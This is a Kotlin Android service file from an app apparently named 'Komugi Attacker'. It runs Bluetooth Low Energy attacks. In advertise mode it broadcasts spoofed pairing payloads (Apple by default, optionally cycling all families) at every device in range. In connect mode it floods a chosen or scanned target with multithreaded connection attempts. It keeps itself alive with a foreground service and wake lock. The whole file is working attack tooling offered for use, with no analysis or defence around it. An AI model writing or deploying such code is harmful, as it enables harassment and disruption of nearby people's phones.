package com.komugi.attacker.ble

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.komugi.attacker.MainActivity
import com.komugi.attacker.R
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel

class SpamService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private var advertiseEngine: AdvertiseEngine? = null
    private var flooder: ConnectFlooder? = null
    private var scanner: TargetScanner? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var config: SpamConfig = SpamConfig()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                shutdown()
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_START -> {
                config = readConfig(intent)
                startForegroundSafely()
                acquireWakeLock()
                launchEngine(config)
                return START_STICKY
            }
        }
        return START_NOT_STICKY
    }

    private fun launchEngine(config: SpamConfig) {
        stopEngines()
        val manager = getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        val adapter = manager?.adapter
        if (adapter == null || !adapter.isEnabled) {
            SpamState.log("service: bluetooth adapter unavailable")
            SpamState.stop()
            shutdown()
            stopSelf()
            return
        }

        val targetLabel = when (config.mode) {
            SpamMode.ADVERTISE -> "All devices in range"
            SpamMode.CONNECT -> config.targetName ?: config.targetAddress ?: "Scanning for targets"
        }
        SpamState.start(config.mode, targetLabel)

        when (config.mode) {
            SpamMode.ADVERTISE -> {
                val payloads = resolvePayloads(config)
                if (payloads.isEmpty()) {
                    SpamState.log("service: no valid payload, stopping")
                    SpamState.stop()
                    shutdown()
                    stopSelf()
                    return
                }
                advertiseEngine = AdvertiseEngine(
                    context = this,
                    config = config,
                    payloads = payloads,
                    namePool = AdvertiseEngine.NAME_POOL,
                ).also { it.start(scope) }
            }

            SpamMode.CONNECT -> {
                val mac = config.targetAddress
                val fixed: BluetoothDevice? = mac?.let {
                    runCatching { adapter.getRemoteDevice(it) }.getOrNull()
                }
                scanner = if (fixed == null) {
                    TargetScanner(this) { }.also { it.start() }
                } else null
                flooder = ConnectFlooder(
                    context = this,
                    targetsProvider = {
                        if (fixed != null) listOf(fixed) else scanner?.devices().orEmpty()
                    },
                    threadCount = config.effectiveThreads,
                ).also { it.start() }
            }
        }
        updateNotification(targetLabel)
    }

    private fun resolvePayloads(config: SpamConfig): List<BlePayload> {
        val custom = Payloads.parseCustom(config.customHex, null)
        if (custom != null) return listOf(custom)
        if (config.family == PayloadFamily.CUSTOM) {
            SpamState.log("service: custom hex rejected, ${config.customHex.length} chars")
            return emptyList()
        }
        return if (config.cycleAllFamilies && config.family == PayloadFamily.APPLE) {
            Payloads.all
        } else {
            Payloads.forFamily(config.family)
        }
    }

    private fun readConfig(intent: Intent): SpamConfig {
        val mode = intent.getStringExtra(EXTRA_MODE)
            ?.let { runCatching { SpamMode.valueOf(it) }.getOrNull() }
            ?: SpamMode.ADVERTISE
        val family = intent.getStringExtra(EXTRA_FAMILY)
            ?.let { runCatching { PayloadFamily.valueOf(it) }.getOrNull() }
            ?: PayloadFamily.APPLE
        return SpamConfig(
            mode = mode,
            family = family,
            customHex = intent.getStringExtra(EXTRA_CUSTOM_HEX).orEmpty(),
            intervalMs = intent.getIntExtra(EXTRA_INTERVAL, 100),
            threads = intent.getIntExtra(EXTRA_THREADS, 6),
            targetAddress = intent.getStringExtra(EXTRA_TARGET_MAC),
            targetName = intent.getStringExtra(EXTRA_TARGET_NAME),
            cycleAllFamilies = intent.getBooleanExtra(EXTRA_CYCLE_ALL, true),
        )
    }

    private fun stopEngines() {
        advertiseEngine?.stop()
        advertiseEngine = null
        flooder?.stop()
        flooder = null
        scanner?.stop()
        scanner = null
    }

    private fun shutdown() {
        stopEngines()
        SpamState.stop()
        scope.cancel()
        releaseWakeLock()
        stopForeground(STOP_FOREGROUND_REMOVE)
    }

    override fun onDestroy() {
        shutdown()
        super.onDestroy()
    }

    private fun acquireWakeLock() {
        if (wakeLock != null) return
        val power = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
        wakeLock = power.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "KomugiAttacker::engine").apply {
            setReferenceCounted(false)
            runCatching { acquire(60 * 60 * 1000L) }
        }
    }

    private fun releaseWakeLock() {
        runCatching { wakeLock?.takeIf { it.isHeld }?.release() }
        wakeLock = null
    }

    private fun startForegroundSafely() {
        val manager = getSystemService(NotificationManager::class.java)
        val channel = NotificationChannel(
            CHANNEL_ID,
            getString(R.string.notification_channel),
            NotificationManager.IMPORTANCE_LOW,
        ).apply { setShowBadge(false) }
        manager?.createNotificationChannel(channel)
        val notification = buildNotification("Preparing engine")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun updateNotification(targetLabel: String) {
        val manager = getSystemService(NotificationManager::class.java) ?: return
        manager.notify(NOTIFICATION_ID, buildNotification(targetLabel))
    }

    private fun buildNotification(targetLabel: String): Notification {
        val openIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val stopIntent = PendingIntent.getService(
            this,
            1,
            Intent(this, SpamService::class.java).setAction(ACTION_STOP),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_stat_komugi)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(targetLabel)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setContentIntent(openIntent)
            .addAction(0, getString(R.string.notification_stop), stopIntent)
            .build()
    }

    companion object {
        const val ACTION_START = "com.komugi.attacker.action.START"
        const val ACTION_STOP = "com.komugi.attacker.action.STOP"
        const val EXTRA_MODE = "mode"
        const val EXTRA_FAMILY = "family"
        const val EXTRA_CUSTOM_HEX = "custom_hex"
        const val EXTRA_INTERVAL = "interval"
        const val EXTRA_THREADS = "threads"
        const val EXTRA_TARGET_MAC = "target_mac"
        const val EXTRA_TARGET_NAME = "target_name"
        const val EXTRA_CYCLE_ALL = "cycle_all"

        private const val CHANNEL_ID = "komugi_engine"
        private const val NOTIFICATION_ID = 6767

        fun start(context: Context, config: SpamConfig) {
            val intent = Intent(context, SpamService::class.java).apply {
                action = ACTION_START
                putExtra(EXTRA_MODE, config.mode.name)
                putExtra(EXTRA_FAMILY, config.family.name)
                putExtra(EXTRA_CUSTOM_HEX, config.customHex)
                putExtra(EXTRA_INTERVAL, config.intervalMs)
                putExtra(EXTRA_THREADS, config.threads)
                putExtra(EXTRA_TARGET_MAC, config.targetAddress)
                putExtra(EXTRA_TARGET_NAME, config.targetName)
                putExtra(EXTRA_CYCLE_ALL, config.cycleAllFamilies)
            }
            ContextCompat.startForegroundService(context, intent)
        }

        fun stop(context: Context) {
            val intent = Intent(context, SpamService::class.java).setAction(ACTION_STOP)
            runCatching { context.startService(intent) }
        }
    }
}
